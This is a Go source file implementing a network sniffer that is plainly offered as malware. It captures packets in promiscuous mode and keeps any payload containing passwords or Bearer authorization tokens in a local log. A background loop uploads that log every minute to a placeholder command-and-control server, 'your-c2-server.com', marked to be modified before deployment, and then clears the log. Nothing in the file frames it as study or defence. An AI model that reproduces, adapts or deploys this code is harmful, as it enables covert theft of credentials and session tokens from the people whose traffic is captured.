package networksniffer

import (
	"fmt"
	"log"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/pcap"
)

// C2 Server URL (Modify before deployment)
const c2ServerURL = "http://your-c2-server.com/network_data"

// Capture Network Traffic
func capturePackets(interfaceName string) {
	handle, err := pcap.OpenLive(interfaceName, 1600, true, pcap.BlockForever)
	if err != nil {
		log.Fatal("[!] Failed to open network interface:", err)
	}
	defer handle.Close()

	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())

	for packet := range packetSource.Packets() {
		processPacket(packet)
	}
}

// Process & Extract Data from Packets
func processPacket(packet gopacket.Packet) {
	networkLayer := packet.NetworkLayer()
	if networkLayer == nil {
		return
	}

	transportLayer := packet.TransportLayer()
	if transportLayer == nil {
		return
	}

	payload := packet.ApplicationLayer()
	if payload != nil {
		data := string(payload.Payload())

		// Filter for sensitive data (passwords, auth tokens, etc.)
		if strings.Contains(data, "password") || strings.Contains(data, "Authorization: Bearer") {
			saveCapturedData(data)
		}
	}
}

// Save Captured Data Locally
func saveCapturedData(data string) {
	file, _ := os.OpenFile("network_capture.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	defer file.Close()
	file.WriteString(data + "\n")
}

// Send Captured Data to C2
func sendCapturedDataToC2() {
	for {
		data, err := os.ReadFile("network_capture.log")
		if err != nil {
			fmt.Println("[!] Error reading log file:", err)
			time.Sleep(30 * time.Second)
			continue
		}

		if len(data) > 0 {
			http.Post(c2ServerURL, "text/plain", strings.NewReader(string(data)))
			os.Truncate("network_capture.log", 0) // Clear log after sending
		}

		time.Sleep(60 * time.Second) // Send logs every minute
	}
}

// Start Network Sniffer
func StartNetworkSniffer(interfaceName string) {
	fmt.Println("[+] Starting Network Sniffer on", interfaceName)
	go capturePackets(interfaceName)
	go sendCapturedDataToC2()
}
